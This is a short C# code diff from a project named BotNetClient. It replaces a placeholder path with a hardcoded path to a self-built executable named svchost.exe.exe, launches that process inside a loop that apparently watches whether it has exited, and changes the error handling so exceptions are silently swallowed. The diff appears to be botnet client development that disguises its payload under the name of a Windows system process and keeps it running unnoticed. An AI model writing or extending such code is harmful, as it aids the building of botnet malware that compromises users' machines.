@@ -14,7 +14,9 @@ namespace BotNetClient
         {
             try
             {
-                Process proc = Process.Start("Путь к подпрограмме");
+                Process proc = new Process();
+                proc.StartInfo.FileName = @"C:\Users\Павел\source\repos\BotNet\svchost.exe\svchost.exe\bin\Release\svchost.exe.exe";
+                proc.Start();
                 while (true)
                 {
                     if (!proc.HasExited)
@@ -27,10 +29,8 @@ namespace BotNetClient
                     }
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-
-                throw;
             }
             finally
             {
